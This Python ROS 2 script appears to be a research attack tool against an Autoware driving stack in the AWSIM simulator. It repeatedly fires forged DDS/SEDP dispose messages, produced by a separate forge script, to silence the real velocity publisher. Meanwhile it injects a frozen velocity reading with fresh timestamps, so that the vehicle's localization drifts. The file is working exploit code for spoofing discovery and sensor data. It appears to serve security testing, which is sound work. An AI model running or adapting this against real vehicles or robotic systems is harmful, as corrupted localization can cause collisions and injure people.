#!/usr/bin/env python3
"""fi1_cycle.py — FI1 old-data / regular-data CYCLE driver (live, coexist+silence).

Alternates, for --cycles rounds:

  OLD-DATA window (--old-sec): the real AWSIM velocity writer is SILENCED at the
    Autoware converter by re-firing Module 1's forged SEDP dispose against the
    converter's participant every --dispose-sec (the proxy is re-created when the
    writer re-announces, so one dispose does not hold — we re-fire). Meanwhile this
    node REPEATS the last real value it saw (frozen, fresh header.stamp) at 30 Hz, so
    the converter -> EKF sees ONLY a stuck value and localization drifts.

  REGULAR window (--reg-sec): stop disposing and stop spoofing. AWSIM re-announces,
    real velocity flows again, EKF recovers. Then the next cycle re-freezes the (new)
    last real value.

The value is captured live during each REGULAR window (spoofer silent then, so what we
receive is genuine); it is frozen at the moment the OLD window starts — a true
"stuck at the last real reading" whose divergence grows as the real vehicle keeps moving.

Runs INSIDE the Autoware container (needs autoware_vehicle_msgs and must reach the
converter). The dispose is raw RTPS multicast on lo (Module 1's forge_withdraw.py).

  python3 fi1_cycle.py --target <AWSIM_WRITER_GUID_hex32> --dst <CONVERTER_PREFIX_hex24>
      --src <MATCHED_PREFIX_hex24> --forge /tmp/forge_withdraw.py
      [--cycles 4] [--old-sec 5] [--reg-sec 5] [--dispose-sec 1.0] [--sim-time]
"""
import argparse, subprocess, sys, time
import rclpy
from rclpy.node import Node
from rclpy.parameter import Parameter
from rclpy.qos import QoSProfile, ReliabilityPolicy, DurabilityPolicy, HistoryPolicy

VelocityReport = None  # bound in main()


class Fi1Cycle(Node):
    def __init__(self, a):
        super().__init__('fi1_cycle')
        if a.sim_time:
            self.set_parameters([Parameter('use_sim_time', Parameter.Type.BOOL, True)])
        self.a = a
        qos = QoSProfile(depth=1, history=HistoryPolicy.KEEP_LAST,
                         reliability=ReliabilityPolicy.RELIABLE,
                         durability=DurabilityPolicy.VOLATILE)
        # subscribe first so REGULAR windows can capture the genuine value
        self.sub = self.create_subscription(VelocityReport, a.topic, self._on_msg, qos)
        self.pub = self.create_publisher(VelocityReport, a.topic, qos)
        self.last_real = None      # updated only in REGULAR (spoofer silent -> genuine)
        self.frozen = None         # value held during the OLD window
        self.seq = 1               # SEDP dispose seqnum, incremented per fire
        self.phase = 'regular'
        self.cycle = 0
        self.t_phase = time.monotonic()
        self.t_dispose = 0.0
        self.frame = 'base_link'
        self.rx = 0
        self.get_logger().info(
            f"fi1_cycle up: topic={a.topic} target={a.target} dst(converter)={a.dst} "
            f"src={a.src} cycles={a.cycles} old={a.old_sec}s reg={a.reg_sec}s "
            f"dispose_every={a.dispose_sec}s")
        # No rclpy timer: an always-ready 30 Hz timer starves the subscription in a
        # single-threaded executor, so last_real never refreshes. main() drives tick()
        # from a manual wall-clock loop that drains the subscription every pass.

    def _on_msg(self, m):
        self.rx += 1
        if self.phase == 'regular':                    # genuine (we are not publishing)
            self.last_real = m
            self.frame = m.header.frame_id or 'base_link'

    def _fire_dispose(self):
        # detached: do not stall the 30 Hz publish loop on forge's internal sleeps
        subprocess.Popen(
            [sys.executable, self.a.forge, '--src', self.a.src, '--dst', self.a.dst,
             '--target', self.a.target, '--seq', str(self.seq), '--repeat', '2'],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.seq += 1

    def _enter(self, phase):
        self.phase = phase
        self.t_phase = time.monotonic()
        if phase == 'old':
            self.frozen = self.last_real
            fv = 'n/a' if self.frozen is None else f"{self.frozen.longitudinal_velocity:.3f}"
            self.get_logger().info(f"[cycle {self.cycle}] OLD-DATA: silence converter + "
                                   f"freeze v={fv} (rx={self.rx} real samples so far)")
            self.t_dispose = 0.0
        else:
            self.get_logger().info(f"[cycle {self.cycle}] REGULAR: release, real data resumes")

    def tick(self):
        now = time.monotonic()
        el = now - self.t_phase
        if self.phase == 'regular':
            if el >= self.a.reg_sec:
                if self.cycle >= self.a.cycles:
                    self.get_logger().info(f"done after {self.cycle} cycles")
                    self.done = True
                    return
                self.cycle += 1
                self._enter('old')
        else:  # old
            # (re)fire the dispose so the deleted proxy does not get re-created mid-window
            if now - self.t_dispose >= self.a.dispose_sec:
                self._fire_dispose()
                self.t_dispose = now
            # repeat the frozen last-real value with a FRESH stamp
            if self.frozen is not None:
                m = VelocityReport()
                m.header.stamp = self.get_clock().now().to_msg()
                m.header.frame_id = self.frame
                m.longitudinal_velocity = self.frozen.longitudinal_velocity
                m.lateral_velocity = self.frozen.lateral_velocity
                m.heading_rate = self.frozen.heading_rate
                self.pub.publish(m)
            if el >= self.a.old_sec:
                self._enter('regular')

    done = False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--target', required=True, help='AWSIM velocity writer GUID hex(32)')
    ap.add_argument('--dst', required=True, help='converter participant guidprefix hex(24)')
    ap.add_argument('--src', required=True, help='a matched participant guidprefix hex(24)')
    ap.add_argument('--forge', required=True, help='path to Module 1 forge_withdraw.py')
    ap.add_argument('--cycles', type=int, default=4)
    ap.add_argument('--old-sec', type=float, default=5.0)
    ap.add_argument('--reg-sec', type=float, default=5.0)
    ap.add_argument('--dispose-sec', type=float, default=1.0)
    ap.add_argument('--sim-time', action='store_true')
    ap.add_argument('--topic', default='/vehicle/status/velocity_status')
    a = ap.parse_args()
    for name, n in (('target', 32), ('dst', 24), ('src', 24)):
        v = getattr(a, name).replace(':', '')
        if len(v) != n:
            ap.error(f"--{name} must be {n} hex chars, got {len(v)}")
        setattr(a, name, v)

    global VelocityReport
    from autoware_vehicle_msgs.msg import VelocityReport as _VR
    VelocityReport = _VR

    rclpy.init()
    node = Fi1Cycle(a)
    period = 1.0 / 30.0
    next_pub = time.monotonic()
    try:
        while rclpy.ok() and not node.done:
            # drain all pending subscription messages (keeps last_real fresh)
            for _ in range(20):
                rclpy.spin_once(node, timeout_sec=0.0)
            now = time.monotonic()
            if now >= next_pub:
                node.tick()
                next_pub += period
                if now - next_pub > period:      # fell behind: resync
                    next_pub = now + period
            else:
                time.sleep(min(0.002, next_pub - now))
    except KeyboardInterrupt:
        pass
    finally:
        if rclpy.ok():
            node.destroy_node()
            rclpy.shutdown()


if __name__ == '__main__':
    main()
